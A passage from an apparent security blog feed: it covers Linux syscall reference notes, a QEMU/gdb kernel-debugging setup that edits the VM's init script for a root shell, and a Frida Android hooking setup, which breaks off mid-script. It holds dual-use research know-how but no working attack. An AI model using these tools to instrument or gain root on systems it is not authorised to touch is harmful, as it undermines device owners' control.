operation);</code>flock()会依参数operation所指定的方式对参数fd所指的文件做各种锁定或解除锁定的动作。此函数只能锁定整个文件，无法锁定文件的某一区域。</li><li>LOCK_SH 建立共享锁定。多个进程可同时对同一个文件作共享锁定。</li><li>LOCK_EX 建立互斥锁定。一个文件同时只有一个互斥锁定。</li><li>LOCK_UN 解除文件锁定状态。</li><li>LOCK_NB 无法建立锁定时，此操作可不被阻断，马上返回进程。通常与LOCK_SH或LOCK_EX 做OR(|)组合。</li><li>单一文件无法同时建立共享锁定和互斥锁定，而当使用dup()或fork()时文件描述词不会继承此种锁定。</li><li>返回值 返回0表示成功，若有错误则返回-1，错误代码存于errno。</li></ul></li><li><p>scandir</p><ul><li><code>int scandir(const char *dir,struct dirent **namelist,int (*filter)(const void *b),int ( * compare )( const struct dirent **, const struct dirent ** ) );</code></li><li><code>int alphasort(const void *a, const void *b);</code></li><li><code>int versionsort(const void *a, const void *b);</code></li><li>函数scandir扫描dir目录下(不包括子目录)满足filter过滤模式的文件，返回的结果是compare函数经过排序的，并保存在namelist中。注意namelist的元素是通过malloc动态分配内存的,所以在使用时要注意释放内存。alphasort和versionsort是使用到的两种排序的函数。 　　</li><li>当函数成功执行时返回找到匹配模式文件的个数，如果失败将返回-1。</li></ul></li><li><p>lstat</p><ul><li><code>int lstat (const char * file_name, struct stat * buf);</code></li><li>函数说明：lstat()与stat()作用完全相同, 都是取得参数file_name 所指的文件状态, 其差别在于, 当文件为符号连接时, lstat()会返回该link 本身的状态. 详细内容请参考stat().</li><li>返回值：执行成功则返回0, 失败返回-1, 错误代码存于errno.</li></ul></li><li><p>read</p><ul><li><code>size_t read(int fd, void * buf, size_t count);</code>read()会把参数fd所指的文件传送count个字节到buf指针所指的内存中. 若参数count为0, 则read()不会有作用并返回0.</li><li>返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.</li><li>如果顺利,read()会返回实际读到的字节数, 最好能将返回值与参数count作比较, 若返回的字节数比要求读取的字节数少, 则有可能读到了文件尾</li><li>当有错误发生时则返回-1, 错误代码存入errno中, 而文件读写位置则无法预期.</li></ul></li><li><p>sscanf</p><ul><li><code>int sscanf(const char *str, const char *format, ...)</code>从字符串读取格式化输入。</li><li>如果成功，该函数返回成功匹配和赋值的个数。如果到达文件末尾或发生读错误，则返回EOF。</li><li>例子<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>( dtm, <span class="string">"Saturday March 25 1989"</span> );</span><br><span class="line"><span class="built_in">sscanf</span>( dtm, <span class="string">"%s %s %d  %d"</span>, weekday, month, &amp;day, &amp;year );</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s %d, %d = %s\n"</span>, month, day, year, weekday )</span><br><span class="line">...</span><br><span class="line">March <span class="number">25</span>, <span class="number">1989</span> = Saturday</span><br></pre></td></tr></table></figure></li></ul></li><li><p>link</p><ul><li><code>int link (const char * oldpath, const char * newpath);</code></li><li>link()以参数newpath指定的名称来建立一个新的连接(硬连接)到参数oldpath所指定的已存在文件. 如果参数newpath指定的名称为一已存在的文件则不会建立连接.</li><li>返回值：成功则返回0, 失败返回-1, 错误原因存于errno.</li></ul></li><li><p>rmdir</p></li><li><p><code>int rmdir(const char *pathname);</code>rmdir函数用于删除一个空目录。</p></li><li><p>getcwd</p></li><li><p><code>char * getcwd(char * buf, size_t size);</code>getcwd()会将当前的工作目录绝对路径复制到参数buf所指的内存空间，参数size为buf的空间大小。</p></li><li><p>unlink</p></li><li><p><code>int unlink(const char * pathname)</code>unlink()会删除参数pathname 指定的文件. 如果该文件名为最后连接点, 但有其他进程打开了此文件, 则在所有关于此文件的文件描述词皆关闭后才会删除. 如果参数pathname 为一符号连接, 则此连接会被删除。</p></li><li><p>pipe</p><ul><li><code>int pipe(int fd[2])</code>创建一个简单的管道，若成功则为数组fd分配两个文件描述符，其中fd[0]用于读取管道，fd[1]用于写入管道</li><li>若成功则返回零，否则返回-1，错误原因存于errno中。</li><li>管道，顾名思义，当我们希望将两个进程的数据连接起来的时候就可以使用它，从而将一个进程的输出数据作为另一个进程的输入数据达到通信交流的目的</li></ul></li><li><p>setsid</p></li><li><p>子进程从父进程继承了：SessionID、进程组ID和打开的终端。子进程如果要脱离这些，代码中可通过调用setsid来实现。而命令行或脚本中可以通过使用命令setsid来运行程序实现。setsid帮助一个进程脱离从父进程继承而来的已打开的终端、隶属进程组和隶属的会话。</p></li><li><p>dup2</p><ul><li><code>int dup2(int oldfd,int newfd);</code></li><li>复制一个现存的文件描述符。当调用dup函数时，内核在进程中创建一个新的文件描述符，此描述符是当前可用文件描述符的最小数值，这个文件描述符指向oldfd所拥有的文件表项。dup2和dup的区别就是可以用newfd参数指定新描述符的数值，如果newfd已经打开，则先将其关闭。如果newfd等于oldfd，则dup2返回newfd, 而不关闭它。</li><li>dup2函数返回的新文件描述符同样与参数oldfd共享同一文件表项。</li></ul></li><li><p>waitpid</p><ul><li><code>pid_t waitpid(pid_t pid, int * status, int options);</code>waitpid()会暂时停止目前进程的执行, 直到有信号来到或子进程结束. 如果在调用wait()时子进程已经结束, 则wait()会立即返回子进程结束状态值. 子进程的结束状态值会由参数status返回, 而子进程的进程识别码也会一块返回. 如果不在意结束状态值, 则参数status可以设成NULL. 参数pid为欲等待的子进程识别码。</li><li>返回值：如果执行成功则返回子进程识别码(PID), 如果有错误发生则返回-1. 失败原因存于errno中.</li></ul></li><li><p>setitimer</p></li><li><p><a href="https://www.cnblogs.com/fnlingnzb-learner/p/5984844.html" target="_blank" rel="noopener">linux几种定时函数的使用</a></p></li><li><p>mmap</p><ul><li><code>void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset)</code><br>该函数主要用途有三个：</li><li>将普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，用内存读写取代I/O读写，以获得较高的性能；</li><li>addr<ul><li>指向欲映射的内存起始地址，通常设为NULL，代表让系统自动选定地址，映射成功后返回该地址。</li></ul></li><li>length<ul><li>代表将文件中多大的部分映射到内存。</li></ul></li><li>prot<ul><li>PROT_EXEC 映射区域可被执行</li><li>PROT_READ 映射区域可被读取</li><li>PROT_WRITE 映射区域可被写入</li><li>PROT_NONE 映射区域不能存取</li></ul></li></ul></li><li><p>sprintf</p><ul><li><code>int sprintf(char *string, char *format [,argument,...]);</code><ul><li>把格式化的数据写入某个字符串中，即发送格式化输出到string所指向的字符串</li></ul></li></ul></li><li><p>ftruncate</p></li><li><p><code>int ftruncate(int fd, off_t  length)</code> ftruncate()会将参数fd指定的文件大小改为参数length指定的大小。参数fd为已打开的文件描述词，而且必须是以写入模式打开的文件。如果原来的文件件大小比参数length大，则超过的部分会被删去</p></li><li><p>lseek</p><ul><li><code>off_t lseek(int fildes, off_t offset, int whence);</code>每一个已打开的文件都有一个读写位置, 当打开文件时通常其读写位置是指向文件开头, 若是以附加的方式打开文件(如O_APPEND), 则读写位置会指向文件尾. 当read()或write()时, 读写位置会随之增加,lseek()便是用来控制该文件的读写位置. 参数fildes 为已打开的文件描述词, 参数offset 为根据参数whence来移动读写位置的位移数.</li><li>参数 whence 为下列其中一种:<ul><li>SEEK_SET 参数offset 即为新的读写位置.</li><li>SEEK_CUR 以目前的读写位置往后增加offset 个位移量.</li><li>SEEK_END 将读写位置指向文件尾后再增加offset 个位移量. 当whence 值为SEEK_CUR 或</li><li>SEEK_END 时, 参数offet 允许负值的出现.</li></ul></li><li>下列是特别的使用方式:<br>1) 欲将读写位置移到文件开头时:lseek(int fildes, 0, SEEK_SET);<br>2) 欲将读写位置移到文件尾时:lseek(int fildes, 0, SEEK_END);<br>3) 想要取得目前文件位置时:lseek(int fildes, 0, SEEK_CUR);</li><li>返回值：当调用成功时则返回目前的读写位置, 也就是距离文件开头多少个字节. 若有错误则返回-1, errno 会存放错误代码.</li></ul></li><li><p>readdir</p><ul><li>readdir()返回参数dir 目录流的下个目录进入点<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    DIR * dir;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> * <span class="title">ptr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    dir = opendir(<span class="string">"/etc/rc.d"</span>);</span><br><span class="line">    <span class="keyword">while</span>((ptr = readdir(dir)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"d_name : %s\n"</span>, ptr-&gt;d_name);</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dir);</span><br><span class="line">&#125;</span><br><span class="line">执行：</span><br><span class="line">d_name : .</span><br><span class="line">d_name : ..</span><br><span class="line">d_name : init.d</span><br><span class="line">d_name : rc0.d</span><br><span class="line">d_name : rc1.d</span><br><span class="line">d_name : rc2.d</span><br><span class="line">d_name : rc3.d</span><br><span class="line">d_name : rc4.d</span><br><span class="line">d_name : rc5.d</span><br><span class="line">d_name : rc6.d</span><br><span class="line">d_name : rc</span><br><span class="line">d_name : rc.local</span><br><span class="line">d_name : rc.sysinit</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://forcemz.net/cxx/2019/04/29/StringFormattingTalk/" target="_blank" rel="noopener">https://forcemz.net/cxx/2019/04/29/StringFormattingTalk/</a><br><a href="http://rk700.github.io/2017/12/28/afl-internals/" target="_blank" rel="noopener">http://rk700.github.io/2017/12/28/afl-internals/</a><br><a href="http://rk700.github.io/2018/01/04/afl-mutations/" target="_blank" rel="noopener">http://rk700.github.io/2018/01/04/afl-mutations/</a></p><h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><ul><li><p>也public到了安全客，可以在我的个人主页查看<br><a href="https://www.anquanke.com/member/133369" target="_blank" rel="noopener">https://www.anquanke.com/member/133369</a></p></li><li><p>欢迎加入我的知识星球<strong>天问之路</strong>，可以获取带目录的pdf版，以及有什么问题可以提问我。</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;afl-gcc小叙&quot;&gt;&lt;a href=&quot;#afl-gcc小叙&quot; class=&quot;headerlink&quot; title=&quot;afl-gcc小叙&quot;&gt;&lt;/a&gt;afl-gcc小叙&lt;/h2&gt;&lt;h3 id=&quot;核心函数&quot;&gt;&lt;a href=&quot;#核心函数&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="Fuzz" scheme="http://eternalsakura13.com/categories/Fuzz/"/>
    
    
      <category term="AFL" scheme="http://eternalsakura13.com/tags/AFL/"/>
    
  </entry>
  
  <entry>
    <title>Linux kernel调试环境:10分钟开箱即用</title>
    <link href="http://eternalsakura13.com/2020/07/11/kernel_qemu/"/>
    <id>http://eternalsakura13.com/2020/07/11/kernel_qemu/</id>
    <published>2020-07-11T05:00:05.098Z</published>
    <updated>2020-07-11T09:25:26.815Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载文件系统"><a href="#下载文件系统" class="headerlink" title="下载文件系统"></a>下载文件系统</h2><p><a href="https://github.com/PKFXXXX/kbin" target="_blank" rel="noopener">https://github.com/PKFXXXX/kbin</a><br>这里也可以换成busybox自己编译，见下文，但是我懒，就找同事要了一个。<br>直接下载解压即可。</p><h2 id="首先apt安装qemu"><a href="#首先apt安装qemu" class="headerlink" title="首先apt安装qemu"></a>首先apt安装qemu</h2><p>直接<code>sudo apt install qemu</code></p><h2 id="编写-boot-sh"><a href="#编写-boot-sh" class="headerlink" title="编写 boot.sh"></a>编写 <code>boot.sh</code></h2><p><code>bzImage</code>是内核镜像 由vmlinux压缩而来 <code>initramfs.img</code>是磁盘镜像。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./initramfs.img \</span><br><span class="line">-smp 1 \</span><br><span class="line">-append <span class="string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet"</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic \</span><br></pre></td></tr></table></figure><p><code>-s</code>选项是gdb调试用的 端口默认是1234.</p><p>然后<code>./boot.sh</code>则进入qemu虚拟机。</p><h2 id="添加文件"><a href="#添加文件" class="headerlink" title="添加文件"></a>添加文件</h2><p>如果需要添加什么文件，就解压然后放入文件之后重新打包</p><ul><li><p>解压磁盘镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir core</span><br><span class="line">cp initramfs.img core&#x2F;</span><br><span class="line">cd core</span><br><span class="line">cpio -idv &lt; .&#x2F;initramfs.img</span><br></pre></td></tr></table></figure></li><li><p>重打包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd core</span><br><span class="line">find . | cpio -o --format&#x3D;newc &gt; ..&#x2F;initramfs.img</span><br></pre></td></tr></table></figure></li></ul><h2 id="gdb-attach调试"><a href="#gdb-attach调试" class="headerlink" title="gdb attach调试"></a>gdb attach调试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;kbin&#x2F;kernel_env$ gdb -q</span><br><span class="line">(gdb) set arch i386:x86-64                  </span><br><span class="line">(gdb) target remote localhost:1234</span><br></pre></td></tr></table></figure><p>这里<code>set arch i386:x86-64</code>是为了解决一些奇妙的bug,如果不加可以调试就不用加了。</p><h2 id="查看函数地址"><a href="#查看函数地址" class="headerlink" title="查看函数地址"></a>查看函数地址</h2><p>如果要查看函数的地址，可以通过<code>cat /proc/kallsyms</code>搜索，但是需要root权限<br>在本地获得root权限可以直接去改磁盘镜像根目录下的init文件。这个init文件会在kernel初始化后执行。<br><code>sakura@ubuntu:~/kbin/kernel_env/core$ cat init</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\nBoot took <span class="variable">$(cut -d' ' -f1 /proc/uptime)</span> seconds\n"</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>这里的重点是<code>setuidgid 0</code>则创建一个root shell。<br>然后断下来就是这样。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-11-055746.png" alt=""></p><h2 id="编译busybox-可选"><a href="#编译busybox-可选" class="headerlink" title="编译busybox[可选]"></a>编译busybox[可选]</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;busybox.net&#x2F;downloads&#x2F;busybox-1.30.0.tar.bz2</span><br><span class="line">tar -jxvf busybox-1.30.0.tar.bz2</span><br><span class="line">cd busybox-1.30.0</span><br><span class="line">make menuconfig</span><br><span class="line">进Settings，勾上Build static binary (no shared libs)</span><br><span class="line"></span><br><span class="line">make install -j4</span><br></pre></td></tr></table></figure><p>编译完成后跟目录多了一个_install的目录，就是我们编译的结果了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd _install</span><br><span class="line">mkdir proc</span><br><span class="line">mkdir sys</span><br><span class="line">touch init</span><br><span class="line">chmod +x init</span><br></pre></td></tr></table></figure><p>其中init中添加如下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&#123;==DBG==&#125; INIT SCRIPT"</span></span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="comment"># insmod /xxx.ko # load ko</span></span><br><span class="line">mdev -s <span class="comment"># We need this to find /dev/sda later</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"&#123;==DBG==&#125; Boot took <span class="variable">$(cut -d' ' -f1 /proc/uptime)</span> seconds"</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh <span class="comment">#normal user</span></span><br><span class="line"><span class="comment"># exec /bin/sh #root</span></span><br></pre></td></tr></table></figure><p>然后打包<br><code>find . | cpio -o --format=newc &gt; ../initramfs.img</code></p><h2 id="编译内核，替换原本的bzImage"><a href="#编译内核，替换原本的bzImage" class="headerlink" title="编译内核，替换原本的bzImage"></a>编译内核，替换原本的bzImage</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison</span><br><span class="line">wget https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kernel&#x2F;v5.x&#x2F;linux-5.3.tar.gz</span><br><span class="line">tar -xf linux-5.3.tar.gz </span><br><span class="line">cd linux-5.3&#x2F;</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-11-090605.png" alt=""><br>如图可以通过dir命令设置好内核源码目录，就可以带源码调试。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一下，下载最前面我发的环境，然后直接<code>./boot.sh</code>就可以启动了，然后另开一个终端gdb attach上去就能调试了。<br>以后要调试别的版本的内核，也就只要自己编译一个对应版本的，替换掉原先的bzImage即可。<br>需要执行自己写的poc，就解压文件系统，然后放进去，然后重打包就好了，嫌麻烦的话，自己搭建一个server存文件，然后wget也可以，不过qemu里面的network环境相当神奇。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;下载文件系统&quot;&gt;&lt;a href=&quot;#下载文件系统&quot; class=&quot;headerlink&quot; title=&quot;下载文件系统&quot;&gt;&lt;/a&gt;下载文件系统&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/PKFXXXX/kbin&quot; target=&quot;_bla
      
    
    </summary>
    
    
      <category term="kernel" scheme="http://eternalsakura13.com/categories/kernel/"/>
    
    
      <category term="linux kernel" scheme="http://eternalsakura13.com/tags/linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>Frida Android hook</title>
    <link href="http://eternalsakura13.com/2020/07/04/frida/"/>
    <id>http://eternalsakura13.com/2020/07/04/frida/</id>
    <published>2020-07-03T17:10:01.471Z</published>
    <updated>2021-06-22T03:51:06.122Z</updated>
    
    <content type="html"><![CDATA[<h2 id="建了一个知识星球：天问之路"><a href="#建了一个知识星球：天问之路" class="headerlink" title="建了一个知识星球：天问之路"></a>建了一个知识星球：天问之路</h2><p>如果想学习二进制安全，或者和我交流，欢迎来这里找我w<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2021-06-22-034815.jpg" alt=""></p><h2 id="Frida环境"><a href="#Frida环境" class="headerlink" title="Frida环境"></a>Frida环境</h2><p><a href="https://github.com/frida/frida" target="_blank" rel="noopener">https://github.com/frida/frida</a></p><h3 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h3><p>python全版本随机切换，这里提供<a href="https://github.com/pyenv/pyenv#homebrew-on-macos" target="_blank" rel="noopener">macOS上的配置方法</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">brew update</span><br><span class="line">brew install pyenv</span><br><span class="line">echo -e &#39;if command -v pyenv 1&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1; then\n  eval &quot;$(pyenv init -)&quot;\nfi&#39; &gt;&gt; ~&#x2F;.bash_profile</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">下载一个3.8.2，下载真的很慢，要慢慢等</span><br><span class="line">pyenv install 3.8.2</span><br><span class="line"></span><br><span class="line">pyenv versions</span><br><span class="line">sakura@sakuradeMacBook-Pro:~$ pyenv versions</span><br><span class="line">  system</span><br><span class="line">* 3.8.2 (set by &#x2F;Users&#x2F;sakura&#x2F;.python-version)</span><br><span class="line">切换到我们装的</span><br><span class="line">pyenv local 3.8.2</span><br><span class="line">python -V</span><br><span class="line">pip -V</span><br><span class="line">原本系统自带的</span><br><span class="line">python local system</span><br><span class="line">python -V</span><br></pre></td></tr></table></figure><p>另外当你需要临时禁用pyenv的时候<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-17-134140.png" alt=""><br>把这个注释了然后另开终端就好了。</p><p>关于卸载某个python版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Uninstalling Python Versions</span><br><span class="line">As time goes on, you will accumulate Python versions in your $(pyenv root)&#x2F;versions directory.</span><br><span class="line"></span><br><span class="line">To remove old Python versions, pyenv uninstall command to automate the removal process.</span><br><span class="line"></span><br><span class="line">Alternatively, simply rm -rf the directory of the version you want to remove. You can find the directory of a particular Python version with the pyenv prefix command, e.g. pyenv prefix 2.6.8.</span><br></pre></td></tr></table></figure><h3 id="frida安装"><a href="#frida安装" class="headerlink" title="frida安装"></a>frida安装</h3><p>如果直接按下述安装则会直接安装frida和frida-tools的最新版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install frida-tools</span><br><span class="line">frida --version</span><br><span class="line">frida-ps --version</span><br></pre></td></tr></table></figure><p>我们也可以自由安装旧版本的frida，例如12.8.0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pyenv install 3.7.7</span><br><span class="line">pyenv local 3.7.7</span><br><span class="line">pip install frida&#x3D;&#x3D;12.8.0</span><br><span class="line">pip install frida-tools&#x3D;&#x3D;5.3.0</span><br></pre></td></tr></table></figure><p>老版本frida和对应关系<br>对应关系很好找<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-17-134837.png" alt=""></p><h3 id="安装objection"><a href="#安装objection" class="headerlink" title="安装objection"></a>安装objection</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pyenv local 3.8.2</span><br><span class="line">pip install objection</span><br><span class="line">objection -h</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pyenv local 3.7.7</span><br><span class="line">pip install objection&#x3D;&#x3D;1.8.4</span><br><span class="line">objection -h</span><br></pre></td></tr></table></figure><h3 id="frida使用"><a href="#frida使用" class="headerlink" title="frida使用"></a>frida使用</h3><p>下载frida-server并解压，在这里下载<a href="https://github.com/frida/frida/releases/download/12.8.0/frida-server-12.8.0-android-arm64.xz" target="_blank" rel="noopener">frida-server-12.8.0</a></p><p>先adb shell，然后切换到root权限,把之前push进来的frida server改个名字叫fs<br>然后运行frida</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push &#x2F;Users&#x2F;sakura&#x2F;Desktop&#x2F;lab&#x2F;alpha&#x2F;tools&#x2F;android&#x2F;frida-server-12.8.0-android-arm64 &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line">chmod +x fs</span><br><span class="line">.&#x2F;fs</span><br></pre></td></tr></table></figure><p>如果要监听端口，就</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;fs -l 0.0.0.0:8888</span><br></pre></td></tr></table></figure><h3 id="frida开发环境搭建"><a href="#frida开发环境搭建" class="headerlink" title="frida开发环境搭建"></a>frida开发环境搭建</h3><ol><li>安装<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;oleavr&#x2F;frida-agent-example.git</span><br><span class="line">cd frida-agent-example&#x2F;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure></li><li>使用vscode打开此工程，在agent文件夹下编写js，会有智能提示。</li><li><code>npm run watch</code>会监控代码修改自动编译生成js文件</li><li>python脚本或者cli加载_agent.js<br><code>frida -U -f com.example.android --no-pause -l _agent.js</code></li></ol><p>下面是测试脚本</p><p><code>s1.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"sakura"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><p><code>loader.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">device8 = frida.get_device_manager().add_remote_device(<span class="string">"192.168.0.9:8888"</span>)</span><br><span class="line">pid = 